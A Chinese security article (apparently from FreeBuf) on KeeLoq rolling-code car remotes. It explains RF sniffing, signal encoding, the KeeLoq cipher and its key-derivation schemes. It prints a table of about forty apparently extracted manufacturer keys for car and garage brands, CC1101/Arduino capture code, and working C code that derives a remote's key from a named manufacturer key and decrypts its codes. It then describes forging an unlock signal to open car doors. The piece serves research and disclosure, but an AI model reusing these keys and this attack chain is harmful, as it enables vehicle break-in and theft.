@@ -1,0 +1,324 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+![](https://image.3001.net/images/20181219/1545203411_5c19eed38674c.png!small)
+
+## 前言
+
+ **所谓`滚动码(Rolling
+code)`是我们嗅探汽车遥控发射出来的射频信号，发现每一次的射频信号都是不一样的，并且每个信号只能被使用一次，这就是被称为滚动码的原因，本文以`Keeloq`举例，从设备工作频点，遥控信号编码，信号传输协议格式，来介绍滚动码是如何工作的，在介绍一下产生滚动码中最重要的`Keeloq加解密算法`，以及Keeloq算法中使用的`编码秘钥生产规则`，加密中`厂商秘钥泄露`的问题，到最后教大家如何打造一个像`HackCube-Special`的安全研究硬件去对滚动码进行安全研究。**
+
+![Image](https://image.3001.net/images/20181219/1545203417_5c19eed973933.png!small)
+
+## 设备工作场景
+
+`滚动码`相比于`固定码`较为安全一些，因此被部署到需要更强的`安全性` 的设备上，例如`车库门`，住户`门禁`，`拉伸门`之类的用的最多的估计就是`汽车`
+上面了，目前市面上的`汽车`基本都是采用`滚动码`的，所谓的滚动码其实遥控每一次发射的数据都是`唯一`且`不重复`
+的，因为数据是被经过`加密`后的`密文`在发射出来的，通常我们抓数据分析后会发现两次数据中会发生非常大的变化，目前已知在遥控器上常用的加密算法分别为`Keeloq`
+，`Hitag2`。
+
+### 射频频点
+
+![](https://image.3001.net/images/20181219/1545203424_5c19eee062a0e.png!small)将`GQRX`设置在常用的几个频点上观察频谱图来确定遥控工作的频点，通常的工作在`315Mhz`，`433Mhz`极个别的会采用868Mhz，915Mhz这几个频点，然后观察`433.92Mhz`附近的`频谱图`在遥控发射信号时候可以很明显的看到这个频谱的变化：![](https://image.3001.net/images/20181219/1545203432_5c19eee82d78a.png!small)![](https://image.3001.net/images/20181219/1545203435_5c19eeeb6a26a.png!small)我们也可以通过遥控上的`FCC
+ID`在相关网站上查询设备的一些信息，或者是通过遥控上`标注`的信息，通过这个基本可以确定这个遥控工作的`频点`和采用的`调制方式`等等，实在不行还能查看PCB板子上的`晶体振荡器`来算出频率等等。
+
+### 信号波形
+
+![](https://image.3001.net/images/20181219/1545203441_5c19eef102ba8.png!small)![](https://image.3001.net/images/20181219/1545203450_5c19eefaeea7b.png!small)我们将采样的原始数据导入`audacity`就可以看到遥控的信号大概是这样的，可以通过采样时候的频谱和波形看出来我们采用的钥匙是经过`ASK调制`，其中`前导码`作用是让汽车知道将有信号到来注意接收，其中`同步引导码`
+的作用是同步时间，但是在后面审计程序代码中发现程序把这一段`同步引导码`来确定信号的`有效性`的，然后数据传输后会将滚动码序列号功能码状态码一并发送，间隔时间是担心干扰的原因让汽车没有接收到信号所以钥匙会把信号重复发射3-4次，间隔时间就是重复信号的间隔时间，这就是整个钥匙的周期。
+
+### 编码规则
+![](https://image.3001.net/images/20181219/1545203459_5c19ef03808af.png!small)
+
+上图是`Bit`编码的格式一个`Bit`占`3TE`，2个TE高电平信号1个TE低电平信号为`Bit0`，1个TE高两个TE低为`Bit1`，先发送Lsb
+下面为解码实例，假设二进制数据为`01011110`因为先发送最低有效位，所以二进制数据是`0111 1010`然后二进制转化成十六进制为`0x7A`。
+
+####
+![](https://image.3001.net/images/20181219/1545203465_5c19ef09673e5.png!small)根据每个芯片型号来决定发送`数据格式`和内容，但都是大同小异本文以`HC201`举例。
+
+####
+![](https://image.3001.net/images/20181219/1545203469_5c19ef0da5f66.png!small)当按下对应的`功能键（打开车门）`时程序会将对应的`4Bit功能码`，`2Bit溢出码`，`10Bit识别码`，`16Bit同步计数值`通过`Keeloq加密`生成出所谓的`滚动码`，这就是开头`32bit
+滚动码`
+
+`4Bit 功能码`：代表信号执行什么功能，当信号合法就执行对应的功能如`打开车门`，在固定码区域也传输着4Bit
+功能码，但最后还是根据32Bit滚动码中的功能码来执行；`2Bit
+溢出码`：作用是当同步计数值到达65535+1后溢出码增一同步计数值清零，但在审计代码中发现并没有使用该溢出码；`10Bit
+识别码`：此码是取`28Bit序列号`中`最后10Bit`作为设备的识别码；`16Bit
+同步计数值`：每次判断信号合法后汽车执行对应功能并将同步计数值保存下来，当新的信号到来会对比汽车保存的同步计数值，如果小于或者等于将判断信号非法，不执行任何操作，当大于保存的同步计数值，汽车执行对应功能并将同步计数值保存下来，这个在验证作为最关键的一环，这就是为什么汽车能防止`重放攻击`的关键；`28Bit序列号`:相当于每一个遥控都有一个`独立的ID`，在出厂时就会让汽车进入学习模式来保存这遥控的id和同步计数值，以后汽车可以根据此id来判断是否与汽车内部存储器中存储的ID一致，一致为`合法设备`。一辆汽车可以学习多个ID；`4Bit功能码`：作用是传输着对应的功能如打开车门，打开行李箱等等最多代表16种功能，但在后面测试中发现汽车会根据`32Bit滚动码`中的功能码为准；`2Bit状态码`：1Bit表示电池是处于一种低电压状态就是表示电池快没电了，另外1Bit代表信号是否是重复的，前面有说的设备会根据键入的时长来发送多段信号，这就是表示信号的重复可以从上面介绍来看到；最关键的一步就是通过`64Bit`的`编码秘钥`将`同步计数值，识别码，功能码`进行加密的步骤，其中使用的就是Keeloq算法。
+
+### Keeloq 加密算法
+
+现在我们来了解下这个Keeloq算法：![](https://image.3001.net/images/20181219/1545203486_5c19ef1e08114.png!small)加密流程如图所示，首先定义一个非线性表，这`个非线性表`有`5Bit`的输入码在数据寄存器中间隔均匀的取`Bit31，Bit26，Bit20，Bit9，Bit1`总共五个Bit通过NLF（Nonlinear
+Logic Function）`0x3A5C742E`
+产生`1Bit`的输出码，然后输出码在在与`Bit16，Bit0`与秘钥中的`Bit0`进行`异或运算`生成`1Bit`加密数据，然后每次生成出加密数据，秘钥位和数据位都会进行移位，秘钥作为循环移位，加密数据作为数据移位，重复上述步骤`528`次后，得到`4字节密文`。
+![](https://image.3001.net/images/20181219/1545203494_5c19ef265fdc9.png!small)![](https://image.3001.net/images/20181219/1545203500_5c19ef2c77a79.png!small)解密运算方式与加密过程的运算方法基本一样，只是将输入码改变成`Bit30，Bit25，Bit19，Bit8，Bit0`，总共五个Bit通过NLF
+（Nonlinear Logic Function）`0x3A5C742E`
+产生`1Bit`的输出码，然后`1Bit`输出码和`Bit31`与`Bit15`和秘钥中的`Bit15`进行`异或运算`产生出`1Bit`的解密数据，然后每次生成出解密数据，秘钥位和数据位都会进行位移，秘钥作循环移位，解密数据作为移位输入然后重复`528`轮还原`4字节明文`，可以看出算法中最主要的就是`64Bit的编码秘钥`。
+
+### Keeloq 编码秘钥生产算法
+
+我们来看看这个这个编码秘钥生成的机制是什么：![](https://image.3001.net/images/20181219/1545203507_5c19ef33b9709.png!small)简单加密，直接把厂商秘钥当做设备的编码秘钥了。![](https://image.3001.net/images/20181219/1545203514_5c19ef3a0b65f.png!small)`标准秘钥`生成算法假设序列号为`0x1234567`，通过标准的秘钥生成算法来定的话，首先会拿`2+序列号`通过`Keeloq的解密`操作得到`32Bit`的`Lsb`
+为`0x89074278`，然后在拿`6+序列号`通过`Keeloq的解密`操作得到`32Bit Msb`值为:
+`0x0516FBE9`哪这个遥控的编码秘钥为
+`0x0516FBE989074278`，与简单加密不同的是，使用简单加密的厂商生产出来的每个设备编码的秘钥都是`相同`的，而使用`标准秘钥`生成的根据每个遥控秘钥都`不会相同`，意思说如果一辆车上学习了两个遥控，这两个遥控的编码秘钥都不是一样的。![](https://image.3001.net/images/20181219/1545203519_5c19ef3fe807a.png!small)安全秘钥生成算法假设`序列号`为`0x1234567`，`种子码`为`0x12345678`，这个种子码是`随机`的，每个遥控的种子码都是不一样的，首先会用种子码进行`keeloq解密`操作得到`32Bit`的`Lsb`值为:`0x188646d6`，然后在拿`6+序列号`通过`Keeloq的解密`操作得到`32Bit
+Msb`值为:`0xC3C83DA8` 哪这个遥控的编码秘钥为
+`0xC3C83DA8188646d6`。简单说下这`三种加密算法`的区别，首先是简单加密直接拿厂商秘钥加密的话如果是通过`侧信道攻击`，可以获取到`厂商秘钥`，直接可以对其他的设备进行解密操作，然后如果是标准秘钥生成算法，因为每个遥控序列号都是不同的所以生出来的秘钥也是不同的如果使用侧信道攻击只能获取到编码秘钥就是只对这个设备有用然而对其他的设备都没有效果的，但是如果厂商秘钥被其他人获取了，因为发送信号时候会带着`28Bit的序列号`，所以只要别人拿到了这个`厂商秘钥`就能`解密信号`，而`安全秘钥生成算法`就不同了，即使是`厂商秘钥`被别人知道了，也只能拿到前`32位秘钥`，后32位是根据`种子码`生成的，而种子码又是随机生成的，如果是hcs301那就要按住四个键才会把种子码给发射出来，这个种子码只有在学习模式下遥控才需要发射出来给汽车保存，之后就在也不会发射出这个`种子码`了。三种秘钥生成算法各不相同，很多厂商为了贪方便和效率认为只要有加密就可以，没有仔细的了解这三种的区别导致了安全隐患，这秘钥一旦被其他人获取，除了使用了安全秘钥生成算法能确保安全性，市面上的使用简单和标准生成算法的厂商，一旦厂商秘钥被泄露，所生产出出来的设备将不在安全，并且目前大多数是没有联网功能的，如果要升级程序更新秘钥和新的算法只能将设备回厂重新烧录或者找附近的4s店，大多数厂商因为成本和担心发生召回等事件后对名气之类的有负面影响，大多数厂商都是像鸵鸟一样把头埋在沙子了，假装听不到，一般的用户是没有办法自己升级设备程序的能力的，最关键的一环就是厂商秘钥，下面来讲讲下厂商秘钥的问题。
+
+### 厂商秘钥提取
+
+![](https://image.3001.net/images/20181219/1545203528_5c19ef48cf784.png!small)![](https://image.3001.net/images/20181219/1545203534_5c19ef4ed14da.png!small)一般通过获取遥控配套的解码IC就是接收端中的解码IC，通过解码ic的型号查专门的单片机解密厂商把芯片焊下来然后给专门的单片机解密的厂商通过技术手段和专业的仪器将程序读出来，以`HCS301`举例，一般配套的解码ic就是`TDH6301`，解码IC芯片FLASH
+or
+EEPROM种程序都是不可读的，但是可以通过一些技术手段将烧写的文件给读出来，这项技术被称为单片机解密，也有讲单片机破解，单片机攻击，MCU解密，MCU破解等等，将烧写的程序读出来后就可以自己复制和烧写到全新的芯片上这被广泛的用于山寨，如上图为HCS201的开盖图，因为实验室显微镜只能发大到这个倍度并不能清晰的看到电路图，但是需要注意的是用这种方式读出来的程序是经过编译后的，并不能直接获取到源码，但是可以通过提取的程序来和配套的发射端来分析出`厂商秘钥`，不是`编码秘钥`，意思说只要不是使用`安全秘钥模式`的设备都是有`一定风险`，只是破解成本的问题，破解一款芯片成本为几千至上万元不等。![](https://image.3001.net/images/20181219/1545203547_5c19ef5bac1b9.png!small)其实在市面已经发现不止一家厂商已经做出了相关的产品但是这类产品只是作为匹配或者生成出对应汽车厂商的遥控好让车主在原有遥控的基础上增加多一把遥控，或者是在车主丢失遥控的情况生成出遥控降低去4S更换遥控的成本，但这类型的产品安全性往往令人堪忧，作者就从一款遥控生成的设备上提取到了三十多个厂商的代码，涉及有百款左右的汽车。
+
+    
+    
+     • 0• • 铁将军• HOP• CARD• B3E57139• 00• • NORMAL• HCS201
+     • 1• • F3• HOP• CARD• 20065679• 00• • SINGLE• HCS301
+     • 2• • 霍丝• HOP• DOOR• 84551223• 00• • SINGLE• HCS301
+     • 3• • 凯越• HOP• CARD• 0000579a• 01• • SINGLE• HCS301
+     • 4• • 长城哈佛• HOP• CARD• 19980319• 00• • NORMAL• HCS301
+     • 6• • 兴达• HOP• CARD• 01231f2c• 00• • NORMAL• HCS301
+     • 7• • 驰普雷特• HOP• DOOR• 822040AF• 00• • NORMAL• HCS301
+     • 8• • SPARK• HOP• CARD• 68697554• 00• • SINGLE• HCS301
+     • 9• • SEG• HOP• CARD• 88772211• 00• • SINGLE• HCS301
+     • 10• • 红旗• HOP• CARD• 9871ba15• 02• • SINGLE• HCS301
+     • 11• • 长安奔奔• HOP• CARD• abcd5556• 00• • NORMAL• HCS301
+     • 12• • 东南蓝瑟• HOP• CARD• ffffcdef• 00• • NORMAL• HCS301
+     • 13• • 比亚迪F0• HOP• CARD• 20061579• 00• • SINGLE• HCS301
+     • 14• • 霍丝2型• HOP• DOOR• ABCD0001• 00• • SINGLE• HCS301
+     • 15• • 江铃• HOP• CARD• 00000038• 00• • SINGLE• HCS301
+     • 16• • 吉利自由舰• HOP• CARD• 75730750• 00• • SINGLE• HCS301
+     • 17• • 爱丽舍• HOP• CARD• 39EF4226• 0C• • SINGLE• HCS301
+     • 18• • 江铃宝典• HOP• CARD• 19720719• 08• • SINGLE• HCS301
+     • 19• • 新赛格• HOP• CARD• 0000AAAA• 00• • NORMAL• HCS301
+     • 20• • 漳州车库• HOP• CARD• FF7F8D77• 00" • SINGLE• HCS301
+     • 21• • SONATA• HOP• CARD• 4841464C• 00• • NORMAL• HCS301
+     • 22• • 哈佛315• HOP• CARD• 20632891• 00• • SINGLE• HCS301
+     • 23• • 威志• HOP• CARD• 267E0000• 02• • SINGLE• HCS301
+     • 24• • 别克（凯越/乐风/乐骋）• HOP• CARD• 2A5A5F45• 00" • NORMAL• HCS301
+     • 25• • 吉利LG-1（国内版）• HOP• CARD• 4BA685C3• 00" • NORMAL• HCS301
+     • 26• • 华泰圣达菲• HOP• CARD• 97896EF4• 00" • NORMAL• HCS301
+     • 27• • 柳州五菱宏图• HOP• CARD• 2A5A5F34• 00" • NORMAL• HCS301
+     • 28• • 本田理念• HOP• CARD• BDFEEACE• 00" • NORMAL• HCS301
+     • 29• • 威志V2• HOP• CARD• E66AF7DE• 00" • NORMAL• HCS301
+     • 30•   解放J6（不确定）• HOP• CARD• 51275230• 00" • SINGLE• HCS301
+     • 31•   海马福美来（红灯）• HOP• CARD• E6FC9BDF• 00" • NORMAL• HCS301
+     • 32• • 车库通用• HCS101• DOOR• 39f1284• 00• • SINGLE• HCS301
+     • 33•  解放J6（红灯常亮）• HOP• CARD• A0E098AB• 00" • NORMAL• HCS301
+     • 34•   众泰（2012款）• HOP• CARD• 568563dd• 00" • SINGLE• HCS301
+     • 35• • 江淮瑞风• HOP• CARD• 562156ab• 00" • NORMAL• HCS301
+     • 36• • 力帆620• HOP• CARD• E074EE78• 00" • SINGLE• HCS301
+     • 37• • 宇通客车乘客门• HOP• CARD• 5875fd10• 00" • SINGLE• HCS301
+     • 38• • 海马M3• HOP• CARD• 2455b2c1• 00" • SINGLE• HCS301
+     • 39• • 森雅M80/S80/佳宝V80(2014款)• HOP• CARD• 54639def• 00" • NORMAL• HCS301
+     • 40• • 别克君越（06~09款）• HOP• CARD• 1952a8de• 00" • SINGLE• HCS301
+    
+
+据我所知要想修复该问题必须要在汽车和遥控两端更新程序，除非是更新汽车端的接收程序并更换新的遥控设备，如有从业者可以探讨一下修复的方案。
+
+### 风险演示设备
+
+![](https://image.3001.net/images/20181219/1545203560_5c19ef689dc92.png!small)讲完`秘钥泄露`的事，我们要对这个遥控信号进行嗅探，这里我们使用的TI推出的`CC1101`射频芯片，主控端我是使用`ATmega32u4`对射频模块进行配置，我们这里是用的是`CC1101`的`异步接收模式`，使用`CC1101`的`GDO2`用来接收信号数据下面会详细的讲讲：
+
+    
+    
+    #define CC1101_Keeloq_IOCFG2            0x29
+    #define CC1101_Keeloq_IOCFG1            0x2E
+    #define CC1101_Keeloq_IOCFG0            0x06
+    #define CC1101_Keeloq_FIFOTHR           0x47
+    #define CC1101_Keeloq_SYNC1             0xD3
+    #define CC1101_Keeloq_SYNC0             0x91
+    #define CC1101_Keeloq_PKTLEN            0xFF
+    #define CC1101_Keeloq_PKTCTRL1          0x00
+    #define CC1101_Keeloq_PKTCTRL0          0x30
+    #define CC1101_Keeloq_ADDR              0x00
+    #define CC1101_Keeloq_CHANNR            0x00
+    #define CC1101_Keeloq_FSCTRL1           0x06
+    #define CC1101_Keeloq_FSCTRL0           0x00
+    #define CC1101_Keeloq_MDMCFG4           0xF8
+    #define CC1101_Keeloq_MDMCFG3           0x93
+    #define CC1101_Keeloq_MDMCFG2           0x33
+    #define CC1101_Keeloq_MDMCFG1           0x22
+    #define CC1101_Keeloq_MDMCFG0           0xF8
+    #define CC1101_Keeloq_DEVIATN           0x00
+    #define CC1101_Keeloq_MCSM2             0x07
+    #define CC1101_Keeloq_MCSM1             0x20
+    #define CC1101_Keeloq_MCSM0             0x18
+    #define CC1101_Keeloq_FOCCFG            0x16
+    #define CC1101_Keeloq_BSCFG             0x6C
+    #define CC1101_Keeloq_AGCCTRL2          0x00
+    #define CC1101_Keeloq_AGCCTRL1          0x40
+    #define CC1101_Keeloq_AGCCTRL0          0x91
+    #define CC1101_Keeloq_WOREVT1           0x87
+    #define CC1101_Keeloq_WOREVT0           0x6B
+    #define CC1101_Keeloq_WORCTRL           0xFB
+    #define CC1101_Keeloq_FREND1            0x56
+    #define CC1101_Keeloq_FREND0            0x11
+    #define CC1101_Keeloq_FSCAL3            0xE9
+    #define CC1101_Keeloq_FSCAL2            0x2A
+    #define CC1101_Keeloq_FSCAL1            0x00
+    #define CC1101_Keeloq_FSCAL0            0x1F
+    #define CC1101_Keeloq_RCCTRL1           0x41
+    #define CC1101_Keeloq_RCCTRL0           0x00
+    #define CC1101_Keeloq_FSTEST            0x59
+    #define CC1101_Keeloq_PTEST             0x7F
+    #define CC1101_Keeloq_AGCTEST           0x3F
+    #define CC1101_Keeloq_TEST2             0x81
+    #define CC1101_Keeloq_TEST1             0x35
+    #define CC1101_Keeloq_TEST0             0x0B
+
+这个是根据遥控生成的`CC1101`寄存器的配置，可以通过`SmartRF
+Studio`配置完参数后导出，在`CC1101`的`datasheet`中对这些寄存器的作用有非常详细的介绍：
+
+    
+    
+    //参考datasheet写的一个设置工作射频频率的函数，可以使用SmartRF Studio计算得出
+    void setfreq(unsigned long int freq) { 
+      unsigned long freqnum = freq / 396.734569;
+      byte freqx[3];
+      freqx[0] = freqnum;
+      freqx[1] = freqnum >> 8;
+      freqx[2] = freqnum >> 16;
+      cc1101.writeReg(CC1101_FREQ2， freqx[2]); //计算出工作频率后写入相关的寄存器
+      cc1101.writeReg(CC1101_FREQ1， freqx[1]); //计算出工作频率后写入相关的寄存器
+      cc1101.writeReg(CC1101_FREQ0， freqx[0]); //计算出工作频率后写入相关的寄存器
+    }
+    void RF433_Keeloq() {
+      cc1101.SS_PIN = RF433_CS; //设置芯片SPI片选引脚 
+      cc1101.init(); //设置射频芯片基础寄存器设置
+      setfreq(433920000); //设置工作射频频率
+      cc1101.cmdStrobe(CC1101_SRX); //进入接收模式
+      cc1101.writeReg(CC1101_IOCFG2， 0x0d); //使CC1101的GDO2引脚成异步数据输出模式
+      cc1101.writeReg(CC1101_MDMCFG4， 0xc8); //设置速率(9.5K)
+      cc1101.writeReg(CC1101_MDMCFG3， 0x93); //设置速率(9.5K)
+    }
+    
+
+``
+
+在`cc1101.init()`函数中将刚刚的射频配置写入`CC1101`的相关寄存器中，然后我们挑几个关键的讲讲，`setfreq`函数用于将`CC1101`设置在遥控器的工作频率上，然后通过`SPI`发送`CC1101_SRX`指令，使其进入接收数据的状态中，然后通过配置`IOCFG2.GDO2_CFG`这个寄存器，使`CC1101`的`GDO2`输出异步串行数据(类似于网上那种超在生的接收模块)，用了这种`异步接收模式后`就不能使用数据包处理，`FIFO缓存`之类的了，简单的说就是将这个`ASK`的信号解调后通过`CC1101`的`GDO2`的IO将数据输出到与单片机链接的引脚中，这样的好处是接收信号的宽容度高，可以接收多种协议的信号只要在单片机进行处理就可以了，并且可以接收不同速率的两个信号，我举个例子吧。![](https://image.3001.net/images/20181219/1545203578_5c19ef7a669c5.png!small)![](https://image.3001.net/images/20181219/1545203584_5c19ef80d8131.png!small)上面这个的是我通过`HackRF`接收到的原始数据导入到`Audacity`中的数据，然后下面这个是通过`逻辑分析仪`接到`CC1101的GDO2`引脚后的输出波形，然后我们可以看出这个信号被`CC1101`解调后输出为数字信号了，然后我们就可以直接对这个数字信号进行处理解码下来：
+
+    
+    
+    /
+        receive Keeloq data
+    /
+    #include 
+    HackRadio Hackradio = HackRadio();
+    void Setup(){
+        RF433_Keeloq(); //对CC1101进行配置
+        Hackradio.enableReceive(RF433_att); //设置库调用的中断引脚 attachInterrupt(RF433_att， handleInterrupt， CHANGE);
+    }
+    void loop() {
+      if (Hackradio.available()) {
+        detachInterrupt(RF433_att); //禁用中断引脚
+        Cube_PRINT.print("data:");
+        Cube_PRINT.print(Hackradio.getkey()); //串口打印滚动码数据
+        Cube_PRINT.print(";Serial Number:");
+        Cube_PRINT.print(Hackradio.getsn()); //串口打印序列号数据
+        Hackradio.resetAvailable(); //重置接收状态
+        Hackradio.enableReceive(RF433_att); //打印完数据后在启用中断引脚
+      }
+    }
+    
+
+`  
+`
+
+然后根据`RCSwitch`写了一个类似类似接收`Keeloq`信号的库，原理就是通过`arduino`单片机的`attachInterrupt`中断函数每次数字信号的电平发生变化时候，进入到`handleInterrupt中断处理函数`，将每次的时间记录下来，可以参考之前写的`固定码`的那一篇文章，然后在接收到两段信号之间的间隔时间后对之前中断保存的时间进行判断，然后就可以对存下来的时间进行解码了：![](https://image.3001.net/images/20181219/1545203593_5c19ef895bc9d.png!small)然后这个就是我接收一个铁将军品牌的遥控为例进行接收，这个是通过逻辑分析仪接到`CC1101`上的`GDO2`引脚的波形，然后这个数据的协议在前面有介绍到，这里就不过多的讲了。![](https://image.3001.net/images/20181219/1545203598_5c19ef8e49d81.png!small)然后我们按照之前说的编码规则，对存下来的每两个时间进行判断波形，就可以解码得到`10000010101110111001001101001000`这一串`二进制`数据在转成`十六进制``82bb9348`这个就是`Keeloq加密`后的`滚动码`数据了。![](https://image.3001.net/images/20181219/1545203603_5c19ef9382fcd.png!small)相同道理我们得到序列号`二进制`数据`0011100100011000001011011010`然后在转成`十六进制`，得到序列号数据`39182da`，然后我们就可以对这个滚动码数据进行解密了：
+
+    
+    
+    #include
+    #include
+    #include
+    #define KeeLoq_NLF 0x3A5C742E
+    #define bit(x，n) (((x)>>(n))&1)
+    #define g5(x，a，b，c，d，e) (bit(x，a)+bit(x，b)2+bit(x，c)4+bit(x，d)8+bit(x，e)16)
+    typedef unsigned long int uint32_t;
+    typedef unsigned long long int uint64_t;
+    typedef unsigned long u32;
+    typedef unsigned long long u64;
+    uint64_t key;
+    uint32_t  KeeLoq_Encrypt (const uint32_t data， const uint64_t key){
+    uint32_t  x = data， r;
+    for (r = 0; r < 528; r++){
+        x = (x>>1)^((bit(x，0)^bit(x，16)^(uint32_t)bit(key，r&63)^bit(KeeLoq_NLF，g5(x，1，9，20，26，31)))<<31);
+      }
+      return x;
+    }
+    uint32_t  KeeLoq_Decrypt (const uint32_t data， const uint64_t key){
+      uint32_t x = data， r;
+      for (r = 0; r < 528; r++){
+        x = (x<<1)^bit(x，31)^bit(x，15)^(uint32_t)bit(key，(15-r)&63)^bit(KeeLoq_NLF，g5(x，0，8，19，25，30));
+      }
+      return x;
+    }
+    int main(int argc，char * argv[]){
+        unsigned long sn = strtoul(argv[1]，NULL，16);
+        long unsigned int datad，Msb，Lsb，Key_data;
+        unsigned long data = strtoul(argv[2]，NULL，16);
+        key=0xB3E5625A8CCD7139;
+        Msb =KeeLoq_Decrypt(sn+0x60000000，key);
+        Lsb =KeeLoq_Decrypt(sn+0x20000000，key);
+        Msb=Msb <<32;
+        Lsb=Lsb <<32;
+        Lsb=Lsb >>32;
+        Key_data=Msb+Lsb;
+        printf("%lX"，Key_data);
+        printf("\n");
+        datad=KeeLoq_Decrypt(data，Key_data);
+        datad=datad<<32;
+        datad=datad>>32;
+        printf("%lX"，datad);
+        printf("\n");
+        return 0; 
+    }
+
+遥控是铁将军的厂商秘钥为`B3E5625A8CCD7139`他们所使用的是标准秘钥生成算法，所以我们先得算出这个的`编码秘钥`，我们先得使用厂商秘钥解密`639182da(6+序列号)`因此我得到解密数据`7D093B66`这个是编码秘钥的前一部分，然后我们在用厂商秘钥解密`239182da(2+序列号)`然后算出数据`B31C374A`编码秘钥的后面一部分，就得到了完整的编码秘钥`7D093B66B31C374A`，我们就可以通过这个编码秘钥去`解密滚动码`的数据了，可以通过我提供的这个程序算出标准秘钥生成算法的编码秘钥了：
+
+    
+    
+    ./Standard_Keeloq_Decrypt 39182da 82bb9348
+    7D093B66B31C374A
+    42DA560F
+    
+
+``
+
+![](https://image.3001.net/images/20181219/1545203612_5c19ef9c2553d.png!small)`42DA560F`就是通过刚刚得到的滚动码`82bb9348`解密得来的，这个数据内容就不过多的在讲了，说一下这个`同步计数值`吧，这个同步计数值用于`防止重放攻击`，因为每次信号被使用后遥控端会进行递增该值，接收端(汽车)也会保存这个同步计数值，然后在重放之前的信号的话同步值比之前的小然后接收端就不会识别这个信号了.也因此所以被称之为滚动码，然后我们看看下一个滚动码的数据：
+
+    
+    
+    ./Standard_Keeloq_Decrypt 39182da 79a05530
+    42DA5610
+    
+
+``
+
+`79a05530`就是下一次遥控发射出来的滚动码的数据内容解密后发现`42DA5610`与之前的`42DA560F`只有同步计数值的地方发生的改变，但是密文却有着翻天覆地的变化这就得力于`Keeloq`的非线性加密算法了：
+
+    
+    
+    ./Keeloq_Encrypt 22DA5611
+    B5E677C9
+    
+
+``
+
+我们知道秘钥之后就可以在原本同步计数值的基础上递增然后修改功能码为解锁然后带上序列号发送出去就可以打开车门了，我们甚至可以将同步计数值加上几万因此让原本的遥控失效：![](https://image.3001.net/images/20181219/1545203618_5c19efa2c6eee.png!small)可以使用`HackCube-Special`嗅探遥控发射出来的数据作为`滚动码`学习来使用，不会提供`解密`，`发射`，具有危险性的功能我们的硬件产品预计会在 12 月份月底左右上线,
+在我们社区上提交质量不错的文章是有机会拿到第一时间产品的哟，有任何问题的欢迎在[社区](https://unicorn.360.com/hackcube/)上与我们交流。
+
+## 参考链接
+
+<http://www.ti.com/lit/ds/symlink/cc1101.pdf>
+
+<https://www.mouser.com/datasheet/2/268/21143b-64900.pdf>
+
+<https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_garcia.pdf>
+
+<http://tech.163.com/16/0812/10/BU8VB5PI00097U7R.html>
+
+  
+
+ ***本文作者：mobier，转载请注明来自FreeBuf.COM**
+
